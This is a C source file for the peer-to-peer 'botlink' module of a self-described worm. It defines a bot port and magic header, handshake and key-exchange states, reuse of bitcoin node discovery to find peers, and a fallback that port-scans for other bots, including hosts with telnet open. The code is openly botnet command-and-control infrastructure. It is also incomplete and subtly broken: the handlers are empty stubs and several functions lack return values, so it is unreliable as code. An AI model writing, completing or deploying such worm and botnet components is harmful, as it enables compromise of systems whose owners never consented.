/*

bot link..

bots communicating directly, or via third party protocols

Nodes structure was already established for bitcoin..
we also want other protocols to be able to feed messages here

if it cannot connect for X time.. it could use desperate() to port scan for bot port,
also it can start checking every port 23 found for bot port since half the search is over
*/
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/select.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <stdint.h>
#include <time.h>
#include <string.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include "structs.h"
#include "list.h"
#include "utils.h"
#include "botlink.h"
#include "portscan.h"
// for reusing bitcon's node connection function
#include "modules/bitcoin/note_bitcoin.h"

#define BOT_PORT 4843
#define BOT_MAGIC 0xAABBCCDD
#define MIN_BOT_CONNECTIONS 15

// various states of bot communication
enum {
    BOT_NEW=TCP_NEW,
    BOT_HANDSHAKE=4,
    BOT_KEY_EXCHANGE=8,
    BOT_PERFECT=STATE_OK
};



typedef struct _bot_header {
    uint32_t magic;
    uint16_t len;
    uint32_t checksum;
} BotMSGHdr;

// verify the packet is correct and has the entire packet..
int BotMSGVerify(char *buf, int size) {
    BotMSGHdr *_hdr = (BotMSGHdr *)buf;
    
    // ensure it has enough of the packet
    if (size < sizeof(BotMSGHdr)) return 0;
    // check if the magic is correct
    if (_hdr->magic != BOT_MAGIC) return -1;
    
    // now verify we have the entire packet..
    if (size < (sizeof(BotMSGHdr) + _hdr->len)) {
        return 0;
    }
}


typedef struct _bot_variables {
    // in case we wanna save bot information for next connection
    struct _bot_variables *next;
    
    int state;
    
    // encryption key
    char *key;
    int key_size;
    
    // bot ID & size
    char *bot_id;
    int bot_id_size;
} BotVariables;


BotVariables *BotVars(Connection *cptr) {
    if (cptr->buf == NULL) {
        cptr->buf = (char *)malloc(sizeof(BotVariables) + 1);
        
        if (cptr->buf == NULL)
            return NULL;
        
        memset(cptr->buf, 0, sizeof(BotVariables));
    }
    
    return (BotVariables *)cptr->buf;
}



// for port scanning.. we only care about nodes (starting new connections)
// and the main loop
ModuleFuncs botlink_funcs = {
    &botlink_read,
    &botlink_write,
    &botlink_incoming,
    NULL, //&botlink_outgoing,
    &botlink_main_loop,
    &botlink_connect,
    NULL //&botlink_disconnect,
};

Modules HACK_botlink = {
    // required ( NULL, NULL, 0 )
    NULL, NULL, 0,
    // port, state
    BOT_PORT, 0,
    // required 0, 0..  
    0, 0,
    // timer = 5 seconds .. timeout is 15 so it should be fine for catching bad connections
    // we will run this every 5 seconds since we are a WORM
    5,
    // bitcoin functions
    &botlink_funcs, NULL,
    // no magic bytes for portscan
    NULL, 0
};


// botlink desperate
// if we desperately need to attempt to connect to nodes.. we can port scan
int botlink_desperate() {
    Portscan_Add(&HACK_botlink, BOT_PORT);
    Portscan_Enable(BOT_PORT, 1);
}

// initialize the module
int botlink_init(Modules **_module_list) {
    Module_Add(_module_list, &HACK_botlink);
}

int botlink_main_loop(Modules *mptr, Connection *cptr, char *buf, int size) {
    // handle tcp/ip for each connection
    // will flush outgoing queue, and fill incoming
    
    // handle timers (ping/pong)
    // logic for enough nodes
    int connection_count = L_count((LIST *)mptr->connections);
    if (connection_count < MIN_BOT_CONNECTIONS) {
        // attempt to connect to however many nodes we are mising under X connections
        // reuse bitcoin connect nodes..
        bitcoin_connect_nodes(mptr, MIN_BOT_CONNECTIONS - connection_count);
    } 
}

// will handle encryption for talking to other bots
int botlink_write(Modules *mptr, Connection *cptr, char **buf, int *size) {
    BotVariables *vars = BotVars(cptr);
    if (!vars || vars->key_size == 0) return *size;
}

// will handle decryption for communication with other bots
int botlink_read(Modules *mptr, Connection *cptr, char **buf, int *size) {
    BotVariables *vars = BotVars(cptr);
    if (!vars || vars->key_size == 0) return *size;
}


// parsing incoming bot messages
int botlink_incoming(Modules *mptr, Connection *cptr, char *buf, int size) {
    int i = 0;
    int ret = -1;
    BotVariables *vars = BotVars(cptr);
    struct _botlink_parsers {
        int state;
        module_func function;    
    } BotlinkParsers[] = {
        { BOT_NEW, &botlink_new },
        { BOT_HANDSHAKE, &botlink_new },
        { BOT_KEY_EXCHANGE, &botlink_keyexchange },
        { BOT_PERFECT, &botlink_message },
        { 0, NULL }
    };
    
    // ensure we have bot variables.. if not we wanna kill it
    if (vars == NULL) return ret;
    
    // verify whether or not the messages passes.. or not enough data, etc..
    i = BotMSGVerify(buf, size);
    
    // if it doesnt, or needs more data.. return that value
    if (i <= 0) return i;

    // ret = -1.. so if the function/state isnt found
    // itll break the connection.. and the function needs to return 1 to remove msgs
    for (i = 0; BotlinkParsers[i].function != NULL; i++) {
        if (BotlinkParsers[i].state == vars->state) {
            ret = BotlinkParsers[i].function(mptr, cptr, buf, size);
            break;
        }
    }
    
    // we dont need the message anymore..
    return ret;
}

// whenever we connect to another bot
// needs to initiate handshake, etc
int botlink_connect(Modules *mptr, Connection *cptr, char *buf, int size) {
    BotVariables *vars = BotVars(cptr);
    if (vars != NULL) {
        
    }
    return 1;
}


int botlink_new(Modules *mptr, Connection *cptr, char *buf, int size) {
    BotVariables *vars = BotVars(cptr);
    
    return 1;
}

int botlink_keyexchange(Modules *mptr, Connection *cptr, char *buf, int size) {
    BotVariables *vars = BotVars(cptr);
    
    return 1;
}

int botlink_message(Modules *mptr, Connection *cptr, char *buf, int size) {
    BotVariables *vars = BotVars(cptr);
    
    return 1;
}


// -- functions not in use..
/*

// whether we need to filter outgoing messages..
// disabled for now.. we wont be filtering our own messages
// for this module
int botlink_outgoing(Modules *mptr, Connection *cptr, char **buf, int *size) {
    
}

// disconnect is disabled for now.. since its irrelevant..
// maybe later we can save the clients structure in a holding place for a bit
int botlink_disconnect(Modules *mptr, Connection *cptr, char *buf, int size) {
    
}
*/